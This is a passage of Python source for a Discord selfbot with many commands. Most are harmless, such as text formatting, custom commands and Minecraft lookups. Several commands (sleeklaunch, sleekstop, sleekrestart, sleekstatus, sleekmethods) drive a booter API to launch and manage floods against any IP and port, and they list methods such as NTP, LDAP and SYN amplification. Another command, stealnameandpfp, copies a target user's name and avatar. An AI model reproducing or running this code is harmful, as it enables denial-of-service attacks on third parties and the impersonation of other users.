        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="setpfp <URL>", description="Sets your Discord profile picture")
    async def setpfp(ctx, url):            
        try:
            await React.user.edit(avatar = bytes(requests.get(url).content), password = discord_password)
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Set Profile Picture', description=f'Changed Discord profile picture',timestamp=embed_timestamp())
            embed.set_thumbnail(url = url)
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="stealnameandpfp <User>", description="Steals someones Discord name and profile picture")
    async def stealnameandpfp(ctx, user: discord.User):
        try:
            await React.user.edit(username = user.name, password = discord_password)
        except Exception:
            pass
        
        try:
            await React.user.edit(avatar = bytes(requests.get(user.avatar_url).content), password = discord_password)
        except Exception:
            pass

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Steal Name and Profile Picture', description=f'Changed Discord username to **{user.name}** \nNew Profile Picture:',timestamp=embed_timestamp())
        embed.set_thumbnail(url = user.avatar_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="whoasked", description="Tells you who asked")
    async def whoasked(ctx):
        await ctx.send('https://cdn.discordapp.com/attachments/752276428342427699/761362503237107732/vsu9brkpb8t41.png')
            
    @React.command(usage="strike <Text>", description="Puts a line through the text")
    async def strike(ctx, *, text):
        await ctx.send(f'~~{text}~~')

    @React.command(usage="spoil <Text>", description="Puts a spoiler on the text")
    async def spoil(ctx, *, text):
        await ctx.send(f'||{text}||')
        
    @React.command(usage="bold <Text>", description="Makes text bold")
    async def bold(ctx, *, text):
        await ctx.send(f'**{text}**')
        
    @React.command(usage="underline <Text>", description="Makes text underlined")
    async def underline(ctx, *, text):
        await ctx.send(f'__{text}__')
        
    @React.command(usage="blockquote <Text>", description="Makes text quoted")
    async def blockquote(ctx, *, text):
        await ctx.send(f'>>> {text} ')
        
    @React.command(usage="italic <Text>", description="Makes text italic")
    async def italic(ctx, *, text):
        await ctx.send(f'*{text}*')

    @React.command(usage="lspoil <Text>", description="Puts a spoiler on each letter of the text")
    async def lspoil(ctx, *, text):
        message = ''
        for l in text:
            message += f'||{l}||'
        await ctx.send(message)
        
    @React.command(usage="upper <Text>", description="Sends text uppercase")
    async def upper(ctx, *, text):
        await ctx.send(text.upper())
        
    @React.command(usage="lower <Text>", description="Sends text lowercase")
    async def lower(ctx, *, text):
        await ctx.send(text.lower())
        
    @React.command(usage="customcmdadd <Command Name Without Prefix> <Content>", description="Creates a custom command")
    async def customcmdadd(ctx, command: str, *, content):
        try:
            with open("CustomCommands.json", "r") as jsonFile:
                data = json.load(jsonFile)
                
            data[json.load(open("config.json", encoding="utf-8"))["prefix"] + command] = content
            
            with open("CustomCommands.json", "w") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Custom Commands',timestamp=embed_timestamp())
            embed.add_field(name=f'__üíª Created Command__', value=f'{json.load(open("config.json", encoding="utf-8"))["prefix"] + command}', inline=False)
            embed.add_field(name=f'__üí¨ Content__', value=f'{content}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await ctx.send(embed=embed)
        except Exception:
            pass
        
    @React.command(usage="customcmdlist", description="Shows available custom commands")
    async def customcmdlist(ctx):
        try:
            with open("CustomCommands.json", "r") as jsonFile:
                data = json.load(jsonFile)
            
            found_cmds = []
            for x, y in dict(data).items():
                found_cmds.append(x)
                
            cmds = ''
                
            for i, cmd in enumerate(found_cmds):
                if i:
                    cmds += '\n'
                cmds += f'{cmd}'
                
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Custom Commands', description=f'Found {len(found_cmds)} custom commands.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.add_field(name='__üëæ Commands__', value=cmds)
            await embed_or_codeblock(ctx, embed)


        except Exception:
            return

    @React.command(usage="giveawayblacklist", description="Shows the giveaway blacklist")
    async def giveawayblacklist(ctx):
        try:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)

            wordarray = []
            for _word in data['giveaway_blocked_words']:
                wordarray.append(_word)
                
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Giveaway Blacklist', description= "\n".join([word for word in wordarray]),timestamp=embed_timestamp())
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await ctx.send(embed=embed)

        except Exception:
            pass
        
    @React.command(usage="giveawayblacklistadd <Word>", description="Add a word to the giveaway word blacklist")
    async def giveawayblacklistadd(ctx, word):
        try:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)

            wordarray = []
            for _word in data['giveaway_blocked_words']:
                wordarray.append(_word)
            
            if word not in wordarray:
                wordarray.append(word)
            data['giveaway_blocked_words'] = wordarray
            giveaway_blocked_words = wordarray
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Giveaway Blacklist',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚úâ Added Word__', value=f'{word}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await ctx.send(embed=embed)

        except Exception:
            pass
        
    @React.command(usage="giveawayblacklistdel <Word>", description="Delete a word from the giveaway word blacklist")
    async def giveawayblacklistdel(ctx, word):
        try:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)

            wordarray = []
            for _word in data['giveaway_blocked_words']:
                wordarray.append(_word)
            
            if word in wordarray:
                wordarray.remove(word)
                
            data['giveaway_blocked_words'] = wordarray
            giveaway_blocked_words = wordarray
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Giveaway Blacklist',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚úâ Deleted Word__', value=f'{word}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await ctx.send(embed=embed)

        except Exception:
            pass
        
    @React.command(usage="customcmddel <Command Name With Prefix>", description="Deletes a custom command")
    async def customcmddel(ctx, command: str):
        try:
            with open("CustomCommands.json", "r") as jsonFile:
                data = json.load(jsonFile)
                
            for i in range(len(data)):
                if data[command]:
                    data.pop(command)
                    break
            
            with open("CustomCommands.json", "w") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Custom Commands',timestamp=embed_timestamp())
            embed.add_field(name=f'__üíª Deleted Command__', value=f'{command}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await ctx.send(embed=embed)
        except:
            pass
        
    @React.command(usage="sleeklaunch <IP> <Port> <Duration> <Method> <PPS>", description="Starts a Sleek.to attack")
    async def sleeklaunch(ctx, target, port, duration, method, pps):
        try:
            sleekapitoken = json.load(open('config.json', encoding='utf-8'))['sleek_api_token']
            r = requests.post(f'https://api.sleek.to/tests/launch?token={sleekapitoken}&target={target}&port={port}&duration={duration}&method={method}&pps={pps}')
            response = r.json()
            success = response['success']
            message = response['message']
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Sleek', description = f"Sending a {method} attack to {target}:{port} for {duration} seconds.",timestamp=embed_timestamp())
            try:
                test_id = response['test_id']
                embed.add_field(name = "Test ID", value = f"{test_id}")
            except:
                pass
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.add_field(name = "__‚úÖ Success__", value = f"{success}")
            embed.add_field(name = "__üí¨ Message__", value = f"{message}")
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="sleekstop <Test ID>", description="Stops a Sleek.to attack")
    async def sleekstop(ctx, test_id):
        try:
            sleekapitoken = json.load(open('config.json', encoding='utf-8'))['sleek_api_token']
            r = requests.post(f'https://api.sleek.to/tests/stop?token={sleekapitoken}&test_id={test_id}')
            response = r.json()
            success = response['success']
            message = response['message']
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Sleek', description = f"Stopping attack with ID {test_id}.",timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.add_field(name = "__‚úÖ Success__", value = f"{success}")
            embed.add_field(name = "__üí¨ Message__", value = f"{message}")
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="sleekrestart <Test ID>", description="Restarts a Sleek.to attack")
    async def sleekrestart(ctx, test_id):
        try:
            sleekapitoken = json.load(open('config.json', encoding='utf-8'))['sleek_api_token']
            r = requests.post(f'https://api.sleek.to/tests/restart?token={sleekapitoken}&test_id={test_id}')
            response = r.json()
            success = response['success']
            message = response['message']
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Sleek', description = f"Restarting attack with ID {test_id}.",timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.add_field(name = "__‚úÖ Success__", value = f"{success}")
            embed.add_field(name = "__üí¨ Message__", value = f"{message}")
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="sleekstatus <Test ID>", description="Shows information about a Sleek.to attack")
    async def sleekstatus(ctx, test_id):
        try:
            sleekapitoken = json.load(open('config.json', encoding='utf-8'))['sleek_api_token']
            r = requests.get(f'https://api.sleek.to/tests?token={sleekapitoken}')
            response = r.json()
            target = None
            port = None
            method = None
            duration = None
            pps = None
            time_remaining = None
            ongoing = None
            for pos, info in enumerate(response):
                if int(info['id']) == int(test_id):
                    target = info['target']
                    port = info['port']
                    method = info['method']
                    duration = info['duration']
                    pps = info['pps']
                    time_remaining = info['time_remaining']
                    ongoing = info['ongoing']
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Sleek', description = f"Information about attack with ID {test_id}.",timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.add_field(name = "__‚ò†Ô∏è Target__", value = f"{target}", inline = True)
            embed.add_field(name = "__üëª Port__", value = f"{port}", inline = True)
            embed.add_field(name = "__üëæ Method__", value = f"{method}", inline = True)
            embed.add_field(name = "__‚è∞ Time Remaining__", value = f"{time_remaining}s", inline = True)
            embed.add_field(name = "__‚è± Duration__", value = f"{duration}s", inline = True)
            embed.add_field(name = "__üç≠ Ongoing__", value = f"{ongoing}", inline = True)
            
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="sleekmethods", description="Shows available Sleek.to attack methods")
    async def sleekmethods(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Sleek Attack Methods', description='''
LDAP
Chargen
NTP
UDPBLEND
ACK
SSYN
ESSYN
XSYN
VSE
FRAG
XMAS
ZAP
Wizard
XACK
SACK
Dominate
''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)


        
    @React.command(usage="mcskin <Minecraft Username>", description="Shows the Minecraft skin of the user")
    async def mcskin(ctx, mcname):
        r = requests.get(f'https://api.mojang.com/users/profiles/minecraft/{mcname}')
        data = r.json()
        name = data['name']
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Minecraft Skin of {name}',timestamp=embed_timestamp())
        embed.set_image(url=f'https://minecraftskinstealer.com/api/v1/skin/render/fullbody/{name}/700')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="httpcat <HTTP Code>", description="Generates a cat image with an HTTP code")
    async def httpcat(ctx, code):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'HTTP Cat',timestamp=embed_timestamp())
        embed.set_image(url=f'https://http.cat/{code}.jpg')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="mcuuid <Minecraft Username>", description="Shows the Minecraft UUID of the user")
    async def mcuuid(ctx, mcname):
        r = requests.get(f'https://api.mojang.com/users/profiles/minecraft/{mcname}')
        data = r.json()
        uuid = data['id']
        name = data['name']
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Minecraft UUID of {name}', description=f'{uuid}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="mcserver <Address>", description="Shows information about a Minecraft Server")
    async def mcserver(ctx, address):
        r = requests.get(f'https://api.mcsrvstat.us/2/{address}')
        data = r.json()
        ip = data['ip']
        port = data['port']
        online = data['online']
        if online == True:
            hostname = data['hostname']
            motd1 = data['motd']['clean'][0]
            motd2 = data['motd']['clean'][1]
            max_players = data['players']['max']
            online_players = data['players']['online']
            version = data['version']
            protocol = data['protocol']
            icon = data['icon']
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Minecraft Server Info', timestamp=embed_timestamp())
        embed.add_field(name = "IP", value = f"{str(ip)}", inline=True)
        embed.add_field(name = "Port", value = f"{str(port)}", inline=True)
        embed.add_field(name = "Online", value = f"{str(online)}", inline=True)
        if online == True:
            embed.add_field(name = "Hostname", value = f"{str(hostname)}", inline=True)
            embed.add_field(name = "Players", value = f"{str(online_players)}/{str(max_players)}", inline=True)
            embed.add_field(name = "Version", value = f"{str(version)}", inline=True)
            embed.add_field(name = "Protocol", value = f"{str(protocol)}", inline=True)
            embed.add_field(name = "MOTD", value = f"{str(motd1)}\n{str(motd2)}", inline=False)
        embed.set_thumbnail(url=f'https://api.mcsrvstat.us/icon/{address}')
